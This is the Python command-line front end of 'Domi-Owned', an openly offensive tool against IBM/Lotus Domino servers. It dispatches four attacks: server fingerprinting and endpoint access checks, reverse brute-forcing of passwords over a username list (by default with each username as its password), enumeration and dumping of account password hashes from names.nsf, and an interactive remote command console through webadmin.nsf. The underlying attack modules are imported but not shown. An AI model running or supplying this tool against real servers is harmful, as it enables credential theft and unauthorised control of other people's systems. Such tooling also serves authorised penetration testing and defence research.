#!/usr/bin/env python3
# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import inflect
import os
import sys

from domi_owned.main import DomiOwned
from domi_owned.helpers import Helpers
from domi_owned.fingerprint import Fingerprint
from domi_owned.bruteforce import BruteForce
from domi_owned.hashdump import HashDump
from domi_owned.quickconsole import QuickConsole

sys.dont_write_bytecode = True


def main():
	parser = argparse.ArgumentParser(
		usage='./domi-owned.py [fingerprint, bruteforce, hashdump, quickconsole] [-h]',
		formatter_class=argparse.RawDescriptionHelpFormatter,
		description=("""
         __________   __________ __________ 
        |          |\|          |          |\\
        |  *    *  |||  *  *  * |        * ||
        |  *    *  |||          |     *    ||
        |  *    *  |||  *  *  * |  *       ||
        |__________|||__________|__________||
        |          || `---------------------`
        |  *    *  ||
        |          ||
        |  *    *  ||
        |__________||
         `----------`

             IBM/Lotus Domino OWNage
"""))
	subparsers = parser.add_subparsers(dest='action', help='Action to perform on IBM/Lotus Domino server')

	fingerprint_parser = subparsers.add_parser('fingerprint', help='Fingerprint the Domino server', usage='./domi-owned.py fingerprint URL --username USERNAME --password PASSWORD')
	fingerprint_parser.add_argument('url', help='Domino server URL')
	fingerprint_parser.add_argument('--username', help='Username', default=None)
	fingerprint_parser.add_argument('--password', help='Password', default=None)

	brute_parser = subparsers.add_parser('bruteforce', help='Reverse brute force the Domino server', usage='./domi-owned.py bruteforce URL USERLIST --password PASSWORD')
	brute_parser.add_argument('url', help='Domino server URL')
	brute_parser.add_argument('userlist', help='List of usernames')
	brute_parser.add_argument('--password', help='Password', default=None)

	dump_parser = subparsers.add_parser('hashdump', help='Dump Domino account hashes', usage='./domi-owned.py hashdump URL --username USERNAME --password PASSWORD')
	dump_parser.add_argument('url', help='Domino server URL')
	dump_parser.add_argument('--username', help='Username', default=None)
	dump_parser.add_argument('--password', help='Password', default=None)

	console_parser = subparsers.add_parser('quickconsole', help='Interact with the Domino Quick Console', usage='./domi-owned.py quickconsole URL --username USERNAME --password PASSWORD')
	console_parser.add_argument('url', help='Domino server URL')
	console_parser.add_argument('--username', help='Username', default=None)
	console_parser.add_argument('--password', help='Password', default=None)

	args = parser.parse_args()

	util = Helpers()
	domino_url = util.check_url(args.url)

	if domino_url:
		domino = DomiOwned(domino_url)

		# Get authentication type
		auth_type = domino.get_auth()
		if auth_type:

			# Fingerprint
			if args.action == 'fingerprint':
				util.print_status('Fingerprinting Domino server')
				fingerprint = Fingerprint(domino)

				domino_version = fingerprint.get_version()
				if domino_version:
					util.print_good("Domino version: {0}".format(domino_version))
				else:
					util.print_warn('Unable to identify Domino server version')

				util.print_good("Authentication type: {0}".format(auth_type.capitalize()))

				endpoints = domino.get_access(args.username, args.password)
				for endpoint in endpoints:
					if endpoints[endpoint] is None:
						util.print_warn("Could not find {0}/{1}".format(domino_url, endpoint))
					elif endpoints[endpoint]:
						if args.username:
							util.print_good("{0} has access to {1}/{2}".format(args.username, domino_url, endpoint))
						else:
							util.print_good("{0}/{1} does not require authentication".format(domino_url, endpoint))
					else:
						if args.username:
							util.print_warn("{0} does not have access to {1}/{2}".format(args.username, domino_url, endpoint))
						else:
							util.print_warn("{0}/{1} requires authentication".format(domino_url, endpoint))

			# Brute force
			elif args.action == 'bruteforce':
				if auth_type == 'open':
					util.print_good("{0}/names.nsf does not require authentication".format(domino_url))
				else:
					if os.path.isfile(args.userlist):
						if args.password is None:
							util.print_status('Starting reverse brute force with username as password')
						else:
							util.print_status("Starting reverse brute force with '{0}' as the password".format(args.password))

						accounts = BruteForce(domino, args.userlist, args.password).bruteforce()
						if accounts:
							util.print_good("Found {0} {1}".format(len(accounts), inflect.engine().plural('account', len(accounts))))
							for account in accounts:
								print("{0}:{1}".format(account['username'], account['password']))
						elif accounts is False:
							util.print_error("Unable to access {0}/names.nsf".format(domino_url))
						else:
							util.print_warn('No accounts found')
					else:
						util.print_error('Unable to find list of usernames')

			# Hash dump
			elif args.action == 'hashdump':
				endpoints = domino.get_access(args.username, args.password)
				if endpoints['names.nsf']:
					util.print_status('Enumerating Domino accounts')
					hashdump = HashDump(domino, args.username, args.password)
					accounts = hashdump.enum_accounts()
					if accounts:
						util.print_good("Dumping {0} account {1}".format(len(accounts), inflect.engine().plural('hash', len(accounts))))
						hashdump.hashdump()
					else:
						util.print_warn('No account hashes found')
				else:
					util.print_error("Unable to access {0}/names.nsf, bad username or password".format(domino_url))

			# Quick Console
			else:
				endpoints = domino.get_access(args.username, args.password)
				if endpoints['webadmin.nsf']:
					util.print_status('Accessing Domino Quick Console')
					console_info = domino.get_info(args.username, args.password)
					if None not in console_info.values():
						util.print_good("Running as {0}".format(console_info['user']))
						QuickConsole(domino, console_info, args.username, args.password).cmdloop()
					else:
						util.print_error('Domino Quick Console is not active')
				else:
					util.print_error("Unable to access {0}/webadmin.nsf, bad username or password".format(domino_url))

		elif auth_type is False:
			util.print_error('Unable to find an instance of names.nsf')
		else:
			util.print_error('Failed to establish a connection to the Domino server')
	else:
		util.print_error('Invalid URL provided')

if __name__ == '__main__':
	main()
